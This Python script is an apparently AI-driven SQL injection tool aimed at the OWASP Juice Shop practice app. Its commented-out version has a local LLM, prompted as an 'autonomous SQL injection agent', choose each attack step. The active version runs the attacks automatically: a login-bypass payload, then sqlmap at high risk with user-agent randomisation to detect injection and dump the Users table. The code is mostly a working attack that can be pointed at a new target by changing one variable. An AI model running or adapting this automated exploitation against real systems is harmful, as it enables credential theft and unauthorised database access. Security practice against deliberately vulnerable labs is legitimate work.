# import subprocess
# import json
# import requests
# import re
# import time
# from bs4 import BeautifulSoup

# # =========================================================
# # CONFIG
# # =========================================================

# OLLAMA_URL = "http://localhost:11434/api/generate"

# MODEL = "deepseek-llm:7b"

# # IMPORTANT:
# # Replace with your Juice Shop container name
# TARGET = "http://juice-shop:3000"

# KALI_CONTAINER = "kali"

# MAX_STEPS = 10

# # =========================================================
# # MEMORY
# # =========================================================

# memory = {
#     "routes": [],
#     "tested": [],
#     "vulnerabilities": [],
#     "observations": [],
#     "dumped_data": []          # NEW: store exploitation results
# }

# # =========================================================
# # ACTIONS
# # =========================================================

# ALLOWED_ACTIONS = [
#     "discover_routes",
#     "test_search_sqli",
#     "test_login_sqli",
#     "run_sqlmap_search",       # detection + auto exploitation
#     "run_sqlmap_login",        # detection + auto exploitation
#     "finish"
# ]

# # =========================================================
# # EXECUTOR
# # =========================================================

# class DockerExecutor:

#     def run(self, command):

#         docker_cmd = [
#             "docker",
#             "exec",
#             KALI_CONTAINER,
#             "bash",
#             "-c",
#             command
#         ]

#         print("\n[EXECUTING]")
#         print(command)

#         result = subprocess.run(
#             docker_cmd,
#             capture_output=True,
#             text=True
#         )

#         return {
#             "stdout": result.stdout[:12000],
#             "stderr": result.stderr[:4000],
#             "returncode": result.returncode
#         }


# executor = DockerExecutor()

# # =========================================================
# # RECON
# # =========================================================

# def discover_routes():

#     print("\n[+] Discovering routes...")

#     discovered = set()

#     try:

#         response = requests.get(TARGET, timeout=10)

#         soup = BeautifulSoup(response.text, "html.parser")

#         scripts = soup.find_all("script")

#         js_files = []

#         for script in scripts:

#             src = script.get("src")

#             if src and ".js" in src:

#                 if src.startswith("/"):

#                     src = TARGET + src

#                 js_files.append(src)

#         print(f"[+] Found {len(js_files)} JS files")

#         for js_url in js_files:

#             try:

#                 print(f"[+] Parsing: {js_url}")

#                 js_content = requests.get(js_url, timeout=20).text

#                 routes = re.findall(r'path:"(.*?)"', js_content)

#                 for route in routes:

#                     if route.strip():

#                         full_route = TARGET + "/" + route.strip("/")

#                         discovered.add(full_route)

#             except Exception as e:

#                 print(f"[!] JS parse failed: {e}")

#         important = [
#             "/rest/products/search?q=test",
#             "/rest/user/login",
#             "/rest/products",
#             "/api/Users"
#         ]

#         for r in important:
#             discovered.add(TARGET + r)

#         memory["routes"] = list(discovered)

#         print(f"[+] Total routes discovered: {len(discovered)}")

#     except Exception as e:

#         print(f"[!] Recon failed: {e}")

# # =========================================================
# # OLLAMA
# # =========================================================

# SYSTEM_PROMPT = """
# You are an autonomous SQL injection agent.

# You MUST respond using JSON only.

# VALID RESPONSE EXAMPLE:

# {"action":"run_sqlmap_search"}

# ONLY choose from:
# - discover_routes
# - test_search_sqli
# - test_login_sqli
# - run_sqlmap_search
# - run_sqlmap_login
# - finish

# DO NOT explain.
# DO NOT use markdown.
# DO NOT write sentences.
# ONLY OUTPUT JSON.
# """

# def ask_ollama():

#     prompt = f"""
# CURRENT MEMORY:
# {json.dumps(memory, indent=2)}

# Choose the next best action.
# """

#     payload = {
#         "model": MODEL,
#         "prompt": SYSTEM_PROMPT + "\n\n" + prompt,
#         "stream": False
#     }

#     try:

#         response = requests.post(
#             OLLAMA_URL,
#             json=payload,
#             timeout=120
#         )

#         data = response.json()

#         if "response" not in data:

#             print("[!] Ollama error")
#             print(data)

#             return None

#         return data["response"]

#     except Exception as e:

#         print(f"[!] Ollama failed: {e}")

#         return None

# # =========================================================
# # PARSER
# # =========================================================

# def parse_action(content):

#     if not content:
#         return None

#     content = content.strip()

#     print("\n[PARSING]")
#     print(content)

#     # -------------------------------------------------
#     # TRY JSON FIRST
#     # -------------------------------------------------

#     try:

#         start = content.find("{")
#         end = content.rfind("}") + 1

#         if start != -1 and end != -1:

#             cleaned = content[start:end]

#             data = json.loads(cleaned)

#             action = data.get("action")

#             if action in ALLOWED_ACTIONS:
#                 return action

#     except Exception:
#         pass

#     # -------------------------------------------------
#     # FALLBACK STRING MATCHING
#     # -------------------------------------------------

#     for action in ALLOWED_ACTIONS:

#         if action in content:
#             return action

#     print("[!] Could not parse action")

#     return None

# # =========================================================
# # TOOL FUNCTIONS
# # =========================================================

# def test_search_sqli():

#     url = TARGET + "/rest/products/search?q='"

#     print(f"\n[+] Testing search SQLi: {url}")

#     try:

#         r = requests.get(url, timeout=15)

#         text = r.text.lower()

#         indicators = [
#             "sql",
#             "sqlite",
#             "syntax",
#             "database",
#             "query failed"
#         ]

#         vulnerable = any(i in text for i in indicators)

#         result = {
#             "endpoint": url,
#             "vulnerable": vulnerable,
#             "status": r.status_code
#         }

#         memory["tested"].append(result)

#         if vulnerable:

#             memory["vulnerabilities"].append({
#                 "type": "Possible SQL Injection",
#                 "endpoint": url
#             })

#             print("[!!!] POSSIBLE SQLi FOUND")

#         else:

#             print("[-] No obvious SQLi")

#     except Exception as e:

#         print(f"[!] Test failed: {e}")

# def test_login_sqli():

#     url = TARGET + "/rest/user/login"

#     payload = {
#         "email": "' OR 1=1--",
#         "password": "test"
#     }

#     print(f"\n[+] Testing login SQLi")

#     try:

#         r = requests.post(
#             url,
#             json=payload,
#             timeout=15
#         )

#         text = r.text.lower()

#         success = (
#             "authentication" in text or
#             "token" in text or
#             r.status_code == 200
#         )

#         result = {
#             "endpoint": url,
#             "status": r.status_code,
#             "possible_bypass": success
#         }

#         memory["tested"].append(result)

#         if success:

#             memory["vulnerabilities"].append({
#                 "type": "Possible Login SQLi",
#                 "endpoint": url
#             })

#             print("[!!!] POSSIBLE LOGIN BYPASS")

#         else:

#             print("[-] Login SQLi failed")

#     except Exception as e:

#         print(f"[!] Login test failed: {e}")

# # =========================================================
# # SQLMAP (with exploitation)
# # =========================================================

# def process_exploit_result(result, target, table_name):
#     """Store dumped data in memory and print a summary."""
#     stdout = result.get("stdout", "")
#     stderr = result.get("stderr", "")

#     if "retrieved:" in stdout:
#         print(f"[+] Successfully dumped data from {table_name}")
#         memory["dumped_data"].append({
#             "target": target,
#             "table": table_name,
#             "output_preview": stdout[:3000]   # save first 3000 chars for review
#         })
#     else:
#         print(f"[-] No data dumped from {table_name} (or sqlmap failed).")
#         if stderr:
#             print(f"[!] stderr: {stderr[:1000]}")

# def run_sqlmap_search():
#     """Test the search endpoint for SQLi. If vulnerable, dump the Users table."""
#     target = TARGET + "/rest/products/search?q=test"

#     print(f"\n[+] Running sqlmap detection on: {target}")

#     # Detection command
#     detect_cmd = f'''sqlmap -u "{target}" -p q --dbms=sqlite --batch --level=3 --risk=2 --random-agent'''
#     result = executor.run(detect_cmd)

#     stdout = result["stdout"].lower()
#     vulnerable = any(v in stdout for v in [
#         "is vulnerable", "sql injection vulnerability",
#         "parameter", "back-end dbms"
#     ])

#     if vulnerable:
#         memory["vulnerabilities"].append({
#             "type": "SQL Injection (search)",
#             "endpoint": target
#         })
#         print("[!!!] Search endpoint is VULNERABLE – dumping Users table...")

#         # Exploitation command (dump Users table only)
#         dump_cmd = f'''sqlmap -u "{target}" -p q --dbms=sqlite --batch -T Users --dump --random-agent'''
#         dump_result = executor.run(dump_cmd)
#         process_exploit_result(dump_result, target, "Users")
#     else:
#         print("[-] Search endpoint does not appear vulnerable.")

#     memory["tested"].append({
#         "endpoint": target,
#         "vulnerable": vulnerable
#     })

# def run_sqlmap_login():
#     """Test the login endpoint for SQLi. If vulnerable, dump the Users table."""
#     target = TARGET + "/rest/user/login"

#     print(f"\n[+] Running sqlmap detection on login endpoint: {target}")

#     # Detection command
#     detect_cmd = f'''sqlmap -u "{target}" --method POST --data='{{"email":"test","password":"test"}}' --headers="Content-Type: application/json" --batch --level=5 --risk=3 --random-agent'''
#     result = executor.run(detect_cmd)

#     stdout = result["stdout"].lower()
#     vulnerable = any(v in stdout for v in [
#         "is vulnerable", "sql injection vulnerability",
#         "parameter", "back-end dbms"
#     ])

#     if vulnerable:
#         memory["vulnerabilities"].append({
#             "type": "SQL Injection (login)",
#             "endpoint": target
#         })
#         print("[!!!] Login endpoint is VULNERABLE – dumping Users table...")

#         # Exploitation command (dump Users table only)
#         dump_cmd = f'''sqlmap -u "{target}" --method POST --data='{{"email":"test","password":"test"}}' --headers="Content-Type: application/json" --batch --dbms=sqlite -T Users --dump --random-agent'''
#         dump_result = executor.run(dump_cmd)
#         process_exploit_result(dump_result, target, "Users")
#     else:
#         print("[-] Login endpoint does not appear vulnerable.")

#     memory["tested"].append({
#         "endpoint": target,
#         "vulnerable": vulnerable
#     })

# # =========================================================
# # MAIN LOOP
# # =========================================================

# def run_action(action):

#     if action == "discover_routes":
#         discover_routes()

#     elif action == "test_search_sqli":
#         test_search_sqli()

#     elif action == "test_login_sqli":
#         test_login_sqli()

#     elif action == "run_sqlmap_search":
#         run_sqlmap_search()

#     elif action == "run_sqlmap_login":
#         run_sqlmap_login()

#     elif action == "finish":
#         return False

#     return True

# # =========================================================
# # MAIN
# # =========================================================

# def main():

#     print("\n===================================")
#     print(" OWASP JUICE SHOP AI AGENT ")
#     print(" OLLAMA + SQLMAP VERSION ")
#     print("===================================")

#     print("\n[+] Initial recon...")
#     discover_routes()

#     for step in range(MAX_STEPS):

#         print(f"\n================ STEP {step+1} ================")

#         llm_output = ask_ollama()

#         if not llm_output:

#             continue

#         print("\n[LLM OUTPUT]")
#         print(llm_output)

#         action = parse_action(llm_output)

#         if not action:

#             continue

#         print(f"\n[ACTION]")
#         print(action)

#         should_continue = run_action(action)

#         if not should_continue:
#             break

#         time.sleep(2)

#     print("\n===================================")
#     print(" FINAL REPORT ")
#     print("===================================")

#     print(json.dumps(memory, indent=2))

# # =========================================================
# # ENTRY
# # =========================================================

# if __name__ == "__main__":
#     main()

import subprocess
import json
import requests
import re
import time
from urllib.parse import urljoin
from bs4 import BeautifulSoup

# =========================================================
# CONFIG
# =========================================================

OLLAMA_URL = "http://localhost:11434/api/generate"
MODEL = "deepseek-llm:7b"

# Set to localhost so both Python and the Kali container (with --network host) reach it
TARGET = "http://localhost:3000"

KALI_CONTAINER = "kali"
MAX_STEPS = 10

# =========================================================
# MEMORY
# =========================================================

memory = {
    "routes": [],
    "tested": [],
    "vulnerabilities": [],
    "observations": [],
    "dumped_data": []
}

# =========================================================
# ALLOWED ACTIONS (for parser reference)
# =========================================================

ALLOWED_ACTIONS = [
    "discover_routes",
    "test_search_sqli",
    "test_login_sqli",
    "run_sqlmap_search",
    "run_sqlmap_login",
    "finish"
]

# =========================================================
# EXECUTOR
# =========================================================

class DockerExecutor:
    def run(self, command):
        docker_cmd = ["docker", "exec", KALI_CONTAINER, "bash", "-c", command]
        print("\n[EXECUTING]")
        print(command)
        result = subprocess.run(docker_cmd, capture_output=True, text=True)
        # Increase cap to 50000 for full dump data
        return {
            "stdout": result.stdout[:50000],
            "stderr": result.stderr[:8000],
            "returncode": result.returncode
        }

executor = DockerExecutor()

# =========================================================
# RECON (fixed relative URLs)
# =========================================================

def discover_routes():
    print("\n[+] Discovering routes...")
    discovered = set()
    try:
        response = requests.get(TARGET, timeout=10)
        soup = BeautifulSoup(response.text, "html.parser")
        scripts = soup.find_all("script")
        js_files = []
        for script in scripts:
            src = script.get("src")
            if src and ".js" in src:
                if not src.startswith(("http://", "https://")):
                    src = urljoin(TARGET, src)
                js_files.append(src)

        print(f"[+] Found {len(js_files)} JS files")

        for js_url in js_files:
            try:
                print(f"[+] Parsing: {js_url}")
                js_content = requests.get(js_url, timeout=20).text
                routes = re.findall(r'path:"(.*?)"', js_content)
                for route in routes:
                    if route.strip():
                        full_route = urljoin(TARGET, route.strip("/"))
                        discovered.add(full_route)
            except Exception as e:
                print(f"[!] JS parse failed: {e}")

        important = [
            "/rest/products/search?q=test",
            "/rest/user/login",
            "/rest/products",
            "/api/Users"
        ]
        for r in important:
            discovered.add(TARGET + r)

        memory["routes"] = list(discovered)
        print(f"[+] Total routes discovered: {len(discovered)}")

    except Exception as e:
        print(f"[!] Recon failed: {e}")

# =========================================================
# SQLMAP FUNCTIONS
# =========================================================

def process_exploit_result(result, target, table_name):
    stdout = result.get("stdout", "")
    stderr = result.get("stderr", "")
    if "retrieved:" in stdout:
        print(f"[+] Successfully dumped data from {table_name}")
        memory["dumped_data"].append({
            "target": target,
            "table": table_name,
            "output_preview": stdout[:5000]   # Keep more for inspection
        })
    else:
        print(f"[-] No data dumped from {table_name} (or sqlmap failed).")
        if stderr:
            print(f"[!] stderr: {stderr[:1000]}")

def run_sqlmap_search():
    """Test the search endpoint for SQLi, then dump Users if vulnerable."""
    target = TARGET + "/rest/products/search?q=test"
    print(f"\n[+] Running sqlmap detection on: {target}")
    detect_cmd = f'''sqlmap -u "{target}" -p q --dbms=sqlite --batch --level=3 --risk=2 --random-agent'''
    result = executor.run(detect_cmd)
    stdout = result["stdout"].lower()
    vulnerable = any(v in stdout for v in [
        "is vulnerable", "sql injection vulnerability",
        "parameter", "back-end dbms"
    ])

    if vulnerable:
        memory["vulnerabilities"].append({
            "type": "SQL Injection (search)",
            "endpoint": target
        })
        print("[!!!] Search endpoint is VULNERABLE – dumping Users table...")
        dump_cmd = f'''sqlmap -u "{target}" -p q --dbms=sqlite --batch -T Users --dump --random-agent'''
        dump_result = executor.run(dump_cmd)
        process_exploit_result(dump_result, target, "Users")
    else:
        print("[-] Search endpoint does not appear vulnerable.")

    memory["tested"].append({"endpoint": target, "vulnerable": vulnerable})

def run_sqlmap_login():
    """Test the login endpoint for SQLi, then dump Users if vulnerable."""
    target = TARGET + "/rest/user/login"
    print(f"\n[+] Running sqlmap detection on login endpoint: {target}")
    detect_cmd = f'''sqlmap -u "{target}" --method POST --data='{{"email":"test","password":"test"}}' --headers="Content-Type: application/json" --batch --level=5 --risk=3 --random-agent'''
    result = executor.run(detect_cmd)
    stdout = result["stdout"].lower()
    vulnerable = any(v in stdout for v in [
        "is vulnerable", "sql injection vulnerability",
        "parameter", "back-end dbms"
    ])

    if vulnerable:
        memory["vulnerabilities"].append({
            "type": "SQL Injection (login)",
            "endpoint": target
        })
        print("[!!!] Login endpoint is VULNERABLE – dumping Users table...")
        dump_cmd = f'''sqlmap -u "{target}" --method POST --data='{{"email":"test","password":"test"}}' --headers="Content-Type: application/json" --batch --dbms=sqlite -T Users --dump --random-agent'''
        dump_result = executor.run(dump_cmd)
        process_exploit_result(dump_result, target, "Users")
    else:
        print("[-] Login endpoint does not appear vulnerable.")

    memory["tested"].append({"endpoint": target, "vulnerable": vulnerable})

# =========================================================
# FORCED EXPLOITATION (no LLM required)
# =========================================================

def main():
    print("\n===================================")
    print(" OWASP JUICE SHOP AI AGENT ")
    print(" OLLAMA + SQLMAP VERSION ")
    print("===================================")

    print("\n[+] Initial recon...")
    discover_routes()

    # Automatically run sqlmap on the two known vulnerable endpoints
    print("\n[+] Automatically running sqlmap on search endpoint...")
    run_sqlmap_search()

    print("\n[+] Automatically running sqlmap on login endpoint...")
    run_sqlmap_login()

    # Show final report
    print("\n===================================")
    print(" FINAL REPORT ")
    print("===================================")
    print(json.dumps(memory, indent=2))

    print("\n[+] Dumped data also saved inside Kali container at:")
    print("    /root/.local/share/sqlmap/output/")
    print("    To copy to your host: docker cp kali:/root/.local/share/sqlmap/output ./sqlmap_output")

if __name__ == "__main__":
    main()